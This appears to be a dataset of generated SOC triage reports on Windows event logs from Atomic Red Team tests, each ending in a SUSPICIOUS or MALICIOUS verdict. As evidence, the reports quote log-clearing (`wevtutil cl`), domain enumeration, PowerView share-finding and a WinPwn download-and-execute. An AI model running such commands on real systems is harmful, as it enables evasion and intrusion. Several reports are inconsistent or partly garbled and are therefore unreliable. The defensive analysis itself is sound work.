   - **Event ID 1102:** This event indicates that the security audit log was cleared. This action can be malicious when done by someone attempting to conceal their malicious activities, especially when done by the ""admin_test"" account (Security log).
   - Multiple **Event ID 5379:** The failure to retrieve credentials, as indicated by several events, might indicate attempts to access unauthorized resources. The use of a Microsoft account and return code 3221226021 suggests failed credential access, which should be further scrutinized (Security log).

2. **Sysmon Logs:**
   - **Event ID 1 (Multiple Occurrences with wevtutil.exe):** The `wevtutil.exe cl <channel>` command was executed multiple times, indicating the clearing of logs on several event channels (Sysmon log). This activity aligns with actions often seen in attempts to cover tracks and is conducted by the ""admin_test"" user.
   - **Event ID 1 (Execution of netscan.exe):** A PowerShell command executed a `netscan.exe` which could be a reconnaissance activity performed in an attempt to map the network hosts (Sysmon log).

3. **PowerShell Logs:**
   - **Events with cmd execution:** The PowerShell execution of a command leading to the execution of a network scanner (`netscan.exe`) indicates suspicious behavior suggesting a possible network profiling attempt (PowerShell log).

4. **System Logs:**
   - **Event ID 104:** System logs also show the clearing of logs, corroborating the cleared events seen in the Sysmon logs using `wevtutil.exe` (System log).

### Assessment

The logs suggest suspicious activity:
- **Log Clearing:** Both security and sysmon logs were cleared using `wevtutil.exe` by the ""admin_test"" account. This is a common technique used to hide traces of potentially malicious activities.
- **Network Scanning:** The execution of `netscan.exe` suggests network reconnaissance activities that were not clearly authorized and typically precede lateral movement or further exploitation.

The correlation of these events points towards potentially malicious intent, with attempts at obfuscation and reconnaissance systematically logged and cleared.

### Resolution

The evidence clearly indicates activities consistent with malicious behavior. However, further investigation is needed to confirm any compromise due to the presence of both sophisticated tools and an environment conducive to IT testing (e.g., use of a reconnaissance tool 'netscan' which is publicly available and sometimes used in legitimate contexts).

**Resolution: SUSPICIOUS**

### Guidance

1. **Immediate Actions:**
   - Isolate the affected system to prevent potential spread or further interactions within the network.
   - Conduct a full investigation on the `admin_test` account to understand the account's origin and usage scope.

2. **Further Investigation:**
   - Review any changes to system configurations, installed applications, or abnormal activities around the time windows of the identified suspicious events.
   - Perform a thorough forensic investigation of the affected and closely connected systems.
   - Correlate these logs with network logs to identify any unauthorized data transmission or attempted connections.

3. **Remediation Steps:**
   - Reset credentials and review access permissions for sensitive accounts.
   - Implement stronger logging and monitoring controls to detect and alert on log-clearing activities or attempts to conceal activities.
   - Educate employees, especially those with administrative access, on recognizing and preventing security threats including phishing and credential theft.

     - `wevtutil.exe` clearing logs: Multiple entries show the use of `wevtutil.exe` to clear logs (Message: `""C:\\Windows\\system32\\wevtutil.exe"" cl`). This is particularly used by `admin_test`.

   - **High Integrity Processes:**
     - Processes like `hostname.exe`, `conhost.exe`, and `whoami.exe` running under the user `admin_test` with a high integrity level. This is normal unless used in an unauthorized manner or to gain more information for privilege escalation.

   - **Use of `fsutil.exe`:**
     - The command `cmd.exe /c fsutil fsinfo drives`, which lists drive information, might suggest a reconnaissance activity, especially because it was executed from the `Temp` directory.
   
3. **Time Change Events:**
   - **Security Log**:
     - Event ID 4616 notes changes to system time, which can be an indicator of malicious activity if not authorized.

4. **Microsoft Edge Update Activity:**
   - Numerous entries related to Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM`. This appears to be a software update mechanism and does not inherently suggest malicious activity.

### Analysis:

- **Log Clearing:**
  - The action of clearing logs is traditionally associated with an attempt to cover tracks after unauthorized or malicious activities on a system.

- **Recurrent Use of System Tools:**
  - While many processes appear benign in isolation, their usage in the sequence observed, along with the context of cleared logs, amplifies concern.
  
- **Use of Reconnaissance Commands:**
  - Commands to list disk drives point towards reconnaissance, particularly concerning when executed unethically.

### Assessment:

Given the observations of cleared logs, unauthorized system activities particularly surrounding process usage and frequent invocation of commands that could facilitate espionage or privilege escalation, there are indicators that suggest potential malicious activity.

### Resolution:

- **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate User Verification:**
   - Verify the identity and recent activities of the user `admin_test`.

2. **Audit User Permissions:**
   - Assess `admin_test` permissions and any recent changes to access rights.

3. **Review Logs and Backup:**
   - Attempt to recover and analyze backup event logs to establish a clear timeline of activities and confirm the extent of potential unauthorized activities.

4. **Network Monitoring:**
   - Increase the monitoring of network activity for indications of data exfiltration or communication with suspicious IP addresses.

5. **Incident Response:**
   - If unauthorized or malicious activity is confirmed, invoke incident response procedures to mitigate and remediate potential threats."
Enumerate all accounts via PowerShell (Domain),"### Detailed Analysis of the Logs

**Suspicious Activities Identified:**

1. **Event Log Clearing:**
   - Multiple instances of the `wevtutil.exe` utility being executed with the `cl` (clear log) parameter on various event logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", ""Windows PowerShell""). 
   - Clearing event logs can be indicative of malicious behavior, especially if done without a legitimate reason, as it may be an attempt to cover tracks.

2. **Unusual PowerShell Usage:**
   - An instance of PowerShell was executed with a command line that involves querying domain users, local group members, and directory users: `powershell.exe & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`.
   - This type of command can be used for reconnaissance purposes to gather information about users and groups, which is often seen in lateral movement or privilege escalation attempts.

3. **Repeated Execution of `net.exe` and `net1.exe`:**
   - The usage of `net.exe` and `net1.exe` with the `user /domain` command, executed via PowerShell. These tools can be used for similar reconnaissance purposes to gather information on user accounts.

4. **Integrity Level:**
   - All the processes run with a high integrity level, indicating that they might have admin privileges. This access level combined with the above actions is particularly concerning.

5. **Parent Process Trace:**
   - Processes like `wevtutil.exe`, `net.exe`, and PowerShell were run as child processes of `wsmprovhost.exe`. While this process is related to Windows Remote Management, multiple interactions and log clearances in such a short time frame are suspicious.

**Event Log Clearing Specifics:**

- Security Log: Cleared by `wevtutil.exe`.
- System Log: Record of log clearance by a user (`admin_test`).
- Application Log: No direct events identified in the logged clearance but correlates with the `wevtutil.exe` usage.
- PowerShell Log: Cleared using `wevtutil.exe`.

**Parent Process:**
- The consistent parent process `C:\\Windows\\system32\\wsmprovhost.exe -Embedding` suggests interactions possibly initiated via remote management, raising flags for a potential unauthorized remote session.

### Assessment of the Situation

The logs indicate multiple actions that collectively present a concerning pattern. While each action could theoretically have legitimate administrative reasons, the combination and context (including event log clearance and sophisticated reconnaissance commands) is indicative of potential compromise or malicious activity.

- **Indicators of Malicious Activity:**
  - Unusual process executions with high integrity and administrative privileges.
  - Event logs being cleared, which is a common tactic used by attackers to hide their activities.
  - Reconnaissance activities in PowerShell, suggesting possible data exfiltration preparation or lateral movement.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Disconnect or Isolate the Host:** To prevent further potential damage or data loss.
   - **Preserve Evidence:** Ensure that other logs and evidence are collected securely before full forensic investigation, especially given that event logs were cleared.

2. **Forensic Investigation:**
   - Conduct a detailed forensic analysis of the host to identify the full scope of activity, entry points, and any associated payloads.
   - Inspect the user account `admin_test` for any signs of compromise or misuse.

3. **Monitoring and Review:**
   - Increase monitoring on network activities from this host.
   - Review access controls and authentication logs related to `wsmprovhost.exe`.

4. **Review Security Policies:**
   - Reinforce security awareness and adherence to access policies to prevent misuse of administrator accounts.
   - Consider restricting PowerShell usage and setting up alerts for specific process executions.

### Final Resolution

The overall assessment of these logs suggest **MALICIOUS** activity. Immediate steps need to be taken to understand the compromise's extent and prevent any possible further actions by the purported threat actors."
System Information Discovery with WMIC,"### Analysis of the Logs:

From the provided logs, I've gathered and interpreted the following key activities:

#### Observed Execution and Activities:
1. **Execution of `whoami.exe`:** 
   - Executed on multiple occasions both at high integrity levels and under the user `SERVER002\\admin_test`. This is a common utility for displaying logged on user information, and by itself, is not inherently suspicious.

2. **Execution of `wevtutil.exe`:**
   - Observed to clear logs in several channels including `Sysmon`, `Application`, `System`, and `Security`. Cleared logs can indicate an attempt to erase traces of activity, which is a common tactic to cover malicious actions.

3. **Multiple `MicrosoftEdgeUpdate.exe` processes:**
   - These processes are executed under `NT AUTHORITY\\SYSTEM`, a very high privilege level.
   - Several instances with different command lines suggest these processes are legitimate updates, as they usually operate at these privileged levels during normal operations.

4. **Execution of System Utilities:**
   - Commands like `wmic` from `cmd.exe` are seen querying system information (`cpu`, `MEMPHYSICAL`, `baseboard`, etc.), which might indicate reconnaissance or system profiling activities.
   - The use of `WMIC.exe` multiple times in quick succession could be routine administrator actions or part of a script execution, but when paired with other activities, could suggest detailed system profiling.

5. **Event Logs Show Clearings:**
   - The `Security`, `System`, and `Windows PowerShell` logs being cleared by the same user `admin_test` suggest an attempt to hide certain operations.

#### Indicators of Possible Malicious Activity:
- **Log Clearing:** Frequent occurrence of event log clearings is strongly suggestive of efforts to hide traces of activity, which aligns with tactics employed by malicious actors.
- **High Integrity Level for Various Commands:** Commands executed with high integrity can suggest usage of elevated privileges which, in combination with clearing logs, is suspicious.
- **System Reconnaissance:** Systematic information retrieval (WMIC) is often used by attackers to gather data about machine specifications and environment setup which could indicate preparation for further exploitation.

#### Conclusion and Recommendations:

Based on my analysis, the combination of executing system utilities at high integrity levels, log clearing activities, and the nature of the WMIC calls indicates suspicious behavior. This activity doesn't conclusively prove malicious intent but exhibits patterns commonly associated with preparatory stages of an attack or an attempt to cover tracks post-exploitation.

- **Resolution:** **SUSPICIOUS**

### Steps to Proceed:

1. **Investigate User Activity:**
   - Check for the legitimacy of the `admin_test` account usage around the time of these logs.
   - Verify whether these actions align with normal administrative processes or routine tasks.

2. **Monitor Further Activity:**
   - Set up alerts for any further suspicious process executions or log clearing activities.
   - Monitor any external connections or access following these events.

3. **Conduct a Full System Audit:**
   - Perform a thorough investigation of any additional signs of compromise that may not be visible in the event logs.
   - Look into any related machines that could potentially be affected by similar activities.

4. **Review Access Controls and Privileges:**
   - Ensure that privilege escalation paths are reviewed and that user accounts have appropriate access levels.

By taking these steps, you can determine whether this activity represents an ongoing threat and take the necessary precautions to protect sensitive systems and data."
PowerView ShareFinder,"Upon reviewing the provided Windows event logs, several points of concern have been identified that suggest suspicious activity that requires further investigation:

1. **PowerShell Activity**:
   - The logs show the execution of PowerShell using a script from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\PowerView.ps1` with the `Invoke-ShareFinder -CheckShareAccess` command. PowerView is a tool often used for network reconnaissance in penetration testing and malicious activities. The execution of scripts from unconventional directories like a Temp folder or under user directory paths can be indicative of an attempt to perform lateral movement or data gathering within the network.

2. **Event Log Clearing**:
   - The `wevtutil.exe` has been used multiple times to clear various logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`). This activity is highly suspicious as attackers often clear event logs to cover their tracks after a breach.

3. **Time Manipulation**:
   - The logs reveal changes in system time using services like `svchost.exe`. Any unsanctioned time changes can be a tactic to evade detection mechanisms that rely on timestamps.

4. **Execution of Potentially Unwanted Processes**:
   - Numerous logs show the execution of the EdgeUpdate process and related components, which by themselves might be regular updates. However, contextually, with the combination of PowerShell script usage and log clearing activities, these could be seen in a different light if they were executed without user approval or outside regular update windows.

5. **Use of Administrative Privileges**:
   - Changes in state and the execution of processes with elevated privileges occur frequently (e.g., 'SeDebugPrivilege'), which might suggest an exploitation of privilege escalation vulnerabilities.

Given these observations, there is significant evidence of potential malicious activity on the system. The usage of PowerShell for reconnaissance, log clearing activities, and manipulation of system time are key indicators of advanced persistent threat behaviors.

### Resolution: SUSPICIOUS

**Recommended Actions**:
- Conduct a full forensic analysis to confirm the intent and scope of the suspicious activities.
- Verify the integrity of the host and related network devices.
- Examine any outbound connections for potential data exfiltration.
- Implement additional monitoring and potentially isolate the affected systems to prevent further spread/impact within the network.
- Review security policies to ensure logs cannot be easily cleared and are instead securely archived.

Continued monitoring and possibly involving threat intelligence experts may be prudent to determine if this activity is part of a broader campaign."
WinPwn - Morerecon,"Upon reviewing the provided logs, several key observations point to potentially malicious activities:

1. **PowerShell Activity**:
   - The PowerShell logs indicate the downloading and execution of a script from a potentially unauthorized GitHub repository (https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/). The script ""WinPwn.ps1"" suggests possible malicious recon or post-exploitation activity.
   - Using `iex` (Invoke-Expression) with a WebClient download is a common method for executing scripts directly from the internet, which is suspicious without a proper justification or approved process.

2. **Security Log Activity**:
   - Event ID 1102: Log clearing activity performed by the user ""admin_test."" This is indicative of log tampering, which is often done to cover tracks or malicious activities.
   - Multiple privilege assignments suggest that ""admin_test"" had elevated privileges (e.g., SeDebugPrivilege) which could have been exploited for further malicious actions.

3. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` used with the ""cl"" (clear) command across multiple logs such as Security, System, and PowerShell logs suggest intentional log clearing by ""admin_test.""
   - The suspicious PowerShell execution (Process ID 6440) further aligns with the potential execution of downloaded malicious scripts.

4. **Other Observations**:
   - Frequent spawning of processes like `conhost.exe`, `wevtutil.exe`, and use of applications such as `MicrosoftEdgeUpdate.exe` can have legitimate use-cases; however, in context with other suspicious activities, they might be used for obfuscation, persistence, or lateral movement.

**Assessment**:
The combination of unusual PowerShell script execution from an unverified source, logging activities indicative of tampering, and the specific user (""admin_test"") invoking high-privilege activities strongly suggest malicious intent and actions. It is concerning that these actions are linked to the CEO's system, which is a high-value target within the organization.

**Resolution**: **MALICIOUS**
- Based on the download and execution of potentially unauthorized scripts, privileged account misuse, and log manipulation, it is clear that these events likely denote a compromise.

**Guidance and Next Steps**:
- Immediately isolate the affected system (Server002) to prevent further malicious actions or lateral movement.
- Conduct a full forensic investigation on the host to understand the scope of the compromise and identify any data exfiltration or further malicious payloads.
- Review and monitor the network for additional signs of compromise or other systems affected.
- Reset credentials and review account permissions for ""admin_test"" and any other affected accounts to remove any unauthorized access or persistence mechanisms.
- Implement additional security monitoring for PowerShell executions, privilege escalations, and logging of security-relevant events."
System Network Connections Discovery with PowerShell,"Upon thorough analysis of the provided event logs from the Windows host, both the Windows PowerShell and Sysmon logs, alongside Application, System, and Security logs, several points require attention:

### Analysis:

#### PowerShell Logs:
- The PowerShell logs indicate multiple executions of the command `powershell.exe & {Get-NetTCPConnection}`. This command is used to retrieve information on active TCP connections, which could be legitimate for troubleshooting or monitoring purposes. However, its frequent execution could also indicate reconnaissance activity if done without prior acknowledgment or need.

#### Sysmon Logs:
- Event logs reveal multiple instances of `wevtutil.exe` being executed to clear event logs, including Security, System, and Windows PowerShell logs. The clearing of event logs (`wevtutil.exe cl`) is a typical attempt by an attacker to cover tracks post-exploitation or intrusion activities. 
- `wevtutil.exe` cleared the following logs:
  - Microsoft-Windows-Sysmon/Operational
  - System
  - Security
  - Windows PowerShell
  
- High Integrity Level processes initiated by `admin_test` on `SERVER002` indicate these commands were executed with elevated privileges, which is a potential security risk if the `admin_test` account was compromised.
  
#### Security Logs:
- There is evidence of time manipulation via the `svchost.exe` process, changing the system time. This is often used to confuse log timestamps and provide ambiguity around the events' occurrence, potentially part of an attempt to disorient detection.

#### System Logs:
- System logs confirm log-clearing activities and the existence of a time adjustment event (`Event ID: 4616`), indicating systemic alterations which can disrupt forensic consistency.

### Assessment:
The activities observed in the logs are highly indicative of malicious behavior, particularly the clearing of multiple critical logs, execution of reconnaissance commands without clear purpose, and time tampering. These actions suggest an attempt to hide tracks following potentially unauthorized activities.

### Resolution:
- **MALICIOUS**: The logs contain clear signs of malicious activity. The executed commands, log-clearing actions, and time manipulation are suspicious indicators commonly associated with unauthorized access or penetration.

### Recommendations:
1. **Immediate Isolation**: Isolate the affected host (`Server002`) from the network to prevent any further unauthorized access or spread of malicious activity.
2. **Conduct a Full Forensic Investigation**: Employ a comprehensive forensic investigation to assess the extent of the compromise and identify any potential unauthorized access or data breach.
3. **User Account Review**: Review and reset credentials for `admin_test` and any privileged accounts to prevent misuse.
4. **Restore and Harden**: Restore the system using known clean backups and harden security measures, including patching, user access controls, and enhancing monitoring.
5. **Monitoring and Alerts**: Deploy advanced monitoring of network and host activities to detect any continued or further malicious activities.

In conclusion, the activities logged are consistent with a timeline of malicious actor behavior attempting to conduct operations covertly on the system. Appropriate incident response measures should be activated immediately."
Port-Scanning -24 Subnet with PowerShell,"After analyzing the provided event logs, several indicators suggest potentially malicious activity:

1. **Clearing of Event Logs**: 
    - Multiple events indicate that the logs on ""Server002"" were cleared by the user ""admin_test"" using the `wevtutil.exe` tool. This is evident in both System and Security logs where entries with `EventID 104` and `EventID 1102` signify log files being cleared for various channels including System, Windows PowerShell, and Security.
    - Clearing logs is a tactic often used by attackers to cover their tracks after malicious activity.

2. **Suspicious PowerShell Activity**:
    - A PowerShell script was executed which appears to be scanning the local subnet for open ports (445 and 3389). This behavior is consistent with network reconnaissance activities often performed by threat actors to identify potential targets within a network.
    - The command-line and script content logged in the PowerShell events suggest a deliberate attempt to map the network environment.

3. **Execution of svchost.exe and Time Manipulation**:
    - There are events showing Time Service changes with roles played by `svchost.exe`. Altering system time and using `svchost.exe` in unusual patterns can be concerning, especially if linked with temporal misdirection tactics in attacks.

4. **Elevation of Privileges**:
    - Security logs show that the user ""admin_test"" gained privileges typically used for administrative tasks (EventID 4672), such as `SeDebugPrivilege` and `SeBackupPrivilege`, around the same time as the logs were cleared, suggesting an elevation of privileges.

5. **Unusual Host Activities**:
    - The EDR alert for this host flagged processes like ""wevtutil.exe"" running with high integrity and related to the user ""admin_test"". This again ties back to the clearing of logs and modification of system audit behavior.

### Assessment
The combination of these observations raises substantial concerns. The clearing of logs to hide PowerShell activity that appears typical of reconnaissance, alongside privilege elevation activities, strongly suggests that there has been unauthorized and likely malicious activity executed on the system by the user ""admin_test"".

### Resolution
- **MALICIOUS**: The activities observed are consistent with malicious tactics designed to explore, exploit, and maintain persistence within the environment while evading detection.

### Guidance on How to Proceed
1. **Immediate Containment**: Isolate the affected system (Server002) to prevent any further lateral movement or data exfiltration.
2. **Investigation**: Conduct a forensic analysis of the compromised system to determine the extent of the breach, including searching for any installed malware, persistent access mechanisms, or other signs of tampering.
3. **Credential Management**: Reset the credentials for the user ""admin_test"" and any other potentially exposed accounts.
4. **System Hardening**: Apply security patches, enhance logging with external logging solutions, and disable unnecessary services or admin tools to reduce further risks.
5. **Monitoring and Alerting**: Enhance detection capabilities to monitor for similar patterns of behavior across other systems.
6. **Review Security Policies**: Conduct a thorough review of current security policies and practices to prevent future occurrences."
Get-WmiObject to Enumerate Domain Controllers,"Upon reviewing the provided logs, several indicators suggest potential security issues, particularly concerning the system activity on ""Server002"". Here's a detailed breakdown:

1. **Event Log Clearing:**
   - The logs indicate that the ""admin_test"" account cleared multiple event logs, including the System, Windows PowerShell, and Security logs (Event IDs: 104 in System logs, 1102 in Security logs). Clearing event logs, especially without a valid maintenance reason, can be an indicator of cover-up attempts, possibly to hide malicious activity.

2. **Process Execution and Command-Line Arguments:**
   - Multiple instances of ""wevtutil.exe"" were executed by the ""admin_test"" user, focusing on clearing logs from various channels (Event ID: 1 in Sysmon logs). The use of ""wevtutil cl"" indicates the deliberate clearing of logs, a suspicious activity.

3. **PowerShell Execution:**
   - A PowerShell command was executed with the intent to interact with WMI (Windows Management Instrumentation) - `get-wmiobject -class ds_computer -namespace root\directory\ldap`. The command involves LDAP queries, which could be a reconnaissance activity, typically seen during lateral movement attempts or network enumeration.

4. **Timezone and System Clock Changes:**
   - Events indicate the system time being adjusted (Event ID: 4616 in Security logs). While this can be a legitimate administrative action, it is often related to attempts to confuse logging and timestamp events during malicious operations.

5. **Privilege Escalation and High-Integrity Level Operations:**
   - The ""admin_test"" user operated at a high integrity level with multiple high-level privileges (Event ID: 4672 in the Security log), like SeDebugPrivilege, which are risky if misused.

6. **Use of Reconnaissance Tools:**
   - The ""whoami.exe"" and ""hostname.exe"" are executed, possibly for user validation and environment mapping, common in reconnaissance stages.

7. **Windows Update and Defender Activities:**
   - Regular update activities for Microsoft Defender were found (Event IDs: 19, 43, 44 in System logs and ID: 15 in Application log), indicating patched environments. This doesn’t directly link to malicious activity but shows system maintenance is active.

Considering these points, the log entries exhibit behaviors commonly associated with stealthy and potentially malicious activities:

- **Log clearing** by a non-standard user with events surrounding reconnaissance.
- **Attempted cover-up** actions by manipulative command executions.
- **Indicators of lateral movement** or preparatory actions for further exploitation.

Given this thorough analysis, the overall resolution based on the log activities is:

**Resolution:** **MALICIOUS**

**Guidance on how to proceed:**
- **Immediate Review:** Conduct a detailed review of the ""admin_test"" account, specifically focusing on recent activities and changes.
- **Access and Privileges Audit:** Validate all privileged accounts and ensure unnecessary privileges are revoked.
- **Containment Measures:** Isolate the affected machine to prevent any lateral movements.
- **Triggered Alert Analysis:** Investigate if similar anomalies are present across the network.
- **Forensics and Recovery:** Initiate forensic imaging of the impacted systems for a comprehensive root cause analysis and initiate recovery plans.
- **Communication with Incident Response Team:** Alert the incident response team for coordinated action.
- **Patch and Monitor:** Ensure the latest security patches are deployed and maintain enhanced monitoring for anomalous activities."
Security Software Discovery - Windows Firewall Enumeration,"### Detailed Analysis

Upon examining the provided logs, there are several noteworthy events and patterns that require closer investigation for potential malicious activity:

#### Anomalous Behavior Identified:
1. **Clearing of Event Logs**
   - **System Log Events 104 and 1102:** The `wevtutil.exe` utility was used multiple times to clear the event logs for System, Security, and Windows PowerShell channels almost simultaneously. This activity is performed by the `admin_test` user.
   - **Sysmon Log Entries:** Corresponding Sysmon logs confirm the execution of `wevtutil.exe` to clear event logs, initiated under a high integrity level and by the `admin_test` account.
   
   Clearing event logs is a common tactic used by attackers to cover their tracks. This is especially concerning if not part of routine maintenance and is performed in close succession for multiple key logs, as in this case.

2. **PowerShell and Command Execution**
   - **Windows PowerShell Log Events:** Multiple PowerShell events show the execution of commands meant to query firewall configurations using `Get-NetFirewallProfile`, `Get-NetFirewallSetting`, and `Get-NetFirewallRule`. PowerShell is a typical vector for executing malicious scripts if exploited.
   - **Sysmon Process Creation Logs:** Support the existence of a PowerShell session executing commands with elevated privileges (`High Integrity`), which may indicate attempts to gather network configuration details or leverage lateral movement tactics.

3. **Process and Execution Clarity:**
   - The `whoami.exe`, `HOSTNAME.EXE` executions seem routine but are initiated by the `admin_test` account. While not malicious on their own, when combined with other activities and the context of log clearing, they may suggest an enumeration behavior typical during an attack to gather system and user information.

#### Logs Indicating Potential Compromise:
- **Sysmon Events (`wevtutil.exe`) and Security Logs (ID 1102)**: These logs strongly indicate that an attempt was made to obscure actions on the machine by clearing audit logs. This is a classic behavior of threat actors once they gain access to a system to avoid detection.

- **PowerShell Network-related Commands**: The PowerShell commands executed are typical of reconnaissance actions that could be a prelude to further exploitation or exfiltration of data.

### Assessment of the Situation
There is a high confidence level that the log activities identified suggest **malicious intent**, primarily due to the execution of `wevtutil.exe` to clear logs coupled with the execution of PowerShell commands for reconnaissance under an account with elevated privileges. The combination of log clearing and network command execution strongly indicates efforts to mask unauthorized activities and gather critical system information potentially.

### Resolution: MALICIOUS

### Guidance on How to Proceed
1. **Immediate Isolation:** Disconnect the server from the network to prevent any potential lateral movement or external communication.
2. **Log Preservation:** Ensure all existing logs are secured and extracted to a secure location for further forensic analysis. 
3. **Gather Additional Evidence:** Assess other servers and endpoints for similar activities or indicators of compromise.
4. **Incident Response Plan:** Initiate the incident response procedures including contacting CERT/IR team, analyzing compromised accounts, and resetting credentials.
5. **Review and Notification:** Examine security configurations and policies, including user permissions and MDM solutions settings to prevent future recurrences and comply with notification requirements if a data breach is suspected.

In conclusion, the actions detected through the logs are consistent with malicious activities and not routine administrative behavior, requiring immediate action and investigation."
Adfind - Enumerate Active Directory OUs,"After reviewing the provided Windows event logs, several activities raise red flags indicating possible malicious actions:

### Suspicious or Anomalous Behavior:

1. **Log Clearing Events:**
   - Security Event Log (EventID 1102): The security event log was cleared by a user named `admin_test` with `SubjectUserSid` indicating a potentially unauthorized user or elevated privileges were used.
   - System Event Log (EventID 104): Clearing of logs also appears in the System channel. This action is commonly associated with attackers attempting to cover their tracks.

2. **Process Execution:**
   - Sysmon logs show multiple command-line executions using `wevtutil.exe` to clear specific logs (`Application`, `System`, and `Security`), executed by the same `admin_test` user account.
   - Execution of `cmd.exe` running `AdFind.exe`, a known tool used for querying Active Directory, suggests an attempt to harvest directory information, a common reconnaissance step in a targeted attack.
   - The use of Microsoft Edge Update processes and temporary locations is generally normal but should be scrutinized if it is not standard procedure for the environment.

3. **Privilege Escalation and Usage:**
   - A sequence of events shows the logging of privilege usage (EventID 4672) aligned with these suspect activities, indicating privileged operations were performed by the same `admin_test` user.

### Assessment and Conclusion:

The logs indicate actions characteristic of an intrusion or post-exploitation activities:
- The clearing of logs and execution of tools such as `AdFind.exe` point towards a threat actor trying to exfiltrate information or prepare a system for further exploitation.
- These activities are often signs of an ongoing attack where the attacker has gained elevated privileges and is attempting to maintain persistence while keeping their presence hidden.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

- **Containment:**
  - Isolate the affected system to prevent further malicious activities and lateral movement.
  
- **Investigation:**
  - Conduct a thorough forensic analysis on `Server002` to gather more evidence and reconstruct the timeline of the attack.

- **User Awareness:**
  - Inform and educate users about best practices to avoid suspicious activities, focusing on enhancing security and awareness.

Taking immediate action based on the findings is critical to ensuring the security and integrity of the company’s network and systems."
Extract Edge Browsing History,"Based on the analysis of the provided Windows event logs, I have identified several indicators that suggest suspicious activity on the machine:

1. **Log File Clearing:**
   - In the Security log, there are events indicating that multiple log files were cleared by the user ""admin_test"". Specifically, Event ID 1102 indicates that the Security, System, and Windows PowerShell logs were cleared. This activity is often a sign of an attempt to cover tracks after potentially malicious activities.

2. **Executed Commands:**
   - The Sysmon and Windows PowerShell logs show the execution of the `wevtutil` command, which is used to clear event logs (e.g., ""C:\\Windows\\system32\\wevtutil.exe cl Security""). The use of this command on security logs is highly unusual and typically associated with malicious intent.

3. **Suspicious PowerShell Activity:**
   - A PowerShell script was executed that involves capturing URLs from browser history and outputting it to a file in the user's Downloads directory (as seen in both the Sysmon and PowerShell logs). The command executed is indicative of possible information gathering and data exfiltration attempts.

4. **Unusual Process Execution:**
   - Multiple instances of potentially sensitive applications, such as whoami.exe and hostname.exe, are observed, which could indicate reconnaissance activity.
   - The svchost.exe process appears in the event logs adjusting system time (Event ID 4616) multiple times, which is unusual and can be used to confuse log timelines and auditing.

Given the evidence of log file clearing, potentially malicious PowerShell usage, and other behaviors associated with evasion and data collection, the activities recorded in the logs suggest a coordinated effort indicative of malicious behavior.

**Conclusion: MALICIOUS**

**Guidance:**
- Immediately isolate the affected system from the network to prevent further potential data exfiltration.
- Conduct a thorough forensic investigation to identify the full scope of the compromise, including identifying any other affected systems.
- Review security policies and controls related to logging, user permissions, and PowerShell execution to strengthen defenses against similar incidents in the future.
- Update EDR rules to monitor for similar patterns moving forward and educate the CEO on safe computing practices."
Process Discovery - Get-Process,"**Detailed Analysis of the Logs:**

1. **Event Logging System:**
   - **Event ID 104 (System Log Cleared):** There are multiple occurrences of event 104, indicating that the logs have been cleared. The user associated with these clear events is `admin_test` on `Server002`. Clearing of logs is an action typically used to cover tracks and is often seen in malicious activity scenarios.

2. **Suspicious Process Executions:**
   - **Usage of `wevtutil.exe`:** This utility is used to manage Windows event logs. The logs show multiple instances of `wevtutil.exe` being used to clear logs, as seen in the Sysmon logs with command lines such as `wevtutil.exe cl System`, `wevtutil.exe cl Application`, and `wevtutil.exe cl ""Windows PowerShell""`. This combination of events and commands is highly suspicious, indicative of attempts to clear traces of activity.
   
3. **Logon and Privilege Escalation Events:**

   - This usage is likely connected to the log-clearing events noted previously, suggesting an attempt to delete evidence.

3. **Command Execution via `cmd.exe` and PowerShell (Sysmon Logs)**
   - The execution of `cmd.exe` with the command `fltmc.exe | findstr.exe 385201` seems anomalous. While `fltmc.exe` is used for managing file system filter drivers, its use here in this context needs further review for unintended usage.
   - No PowerShell logs were presented, yet `wevtutil.exe` indicates clearing of the PowerShell logs, implying potential misuse of PowerShell scripts which were subsequently covered up.

4. **Privilege Abuse and Account Characteristics**
   - The user `admin_test`, operating at a high integrity level, is responsible for the log-clearing activities. The username and the sequence of actions suggest either this account is compromised or it's being misused.

5. **Timing and Sequence of Events**
   - The suspicious activities are tightly timed, suggesting automated or scripted actions. This includes the execution and closing of setup and update processes which normally wouldn't require manual log actions unless managed or manipulated.

**Conclusion:**

Based on the above analysis, the event logs reveal clear signs of potentially unauthorized and malicious activities, with log-clearing being the most apparent indicator of attempted cover-up. The presence of commands and process executions that are typical of malicious behavior further supports this assessment.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**

- Immediately isolate the affected system to prevent further compromise or exfiltration of data.
- Investigate the user account `admin_test` for compromise or unauthorized usage. Consider resetting access credentials and reviewing account permissions.
- Review network traffic logs and endpoint data to determine if any other systems show similar patterns of activity.
- Conduct a comprehensive malware and threat analysis on the system to identify potential backdoors or ongoing threats.
- Restore affected system from a clean backup, ensuring all security patches and updates are applied before reconnecting to the network."
Remote System Discovery - net group Domain Controller,"Based on the provided event logs from the Windows system and Sysmon logs, several activities stand out which may indicate suspicious or potentially malicious behavior. Let's break down the findings:

### Suspicious Behavior:
1. **Event Log Clearing:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) have been invoked with the `cl` (clear logs) command on different channels (`System`, `Security`, `Application`, and `Windows PowerShell`). This was executed by the user `admin_test`. Clearing event logs is a common technique used by attackers to cover their tracks and is notably suspicious.

2. **Grouping and Privilege Enumeration:**
   - There is a `cmd.exe` which executed a `net group /domain ""Domain controllers""` command. This can be used for reconnaissance to gather information about the network's domain controllers, potentially as a step towards further exploitation or privilege escalation.

3. **Frequent Use of High Integrity Level Tools:**
   - The process `whoami.exe` was similarly run, likely for privilege level verification. Although `whoami.exe` by itself is not malicious, its use in conjunction with other suspicious activities could indicate an attempt to verify the context in which a malicious script is executing.

### Signs of Potential Compromise:
- **Log Clearing with `wevtutil.exe`:** The use of `wevtutil.exe` to clear event logs on a corporate device is highly indicative of an attempt to hide an attacker's presence. This should be considered a high-risk behavior.
- **Reconnaissance Commands:** The execution of commands like `net group /domain` suggests possible reconnaissance efforts which are typically associated with lateral movement strategies by attackers.

### Summary of Observations:
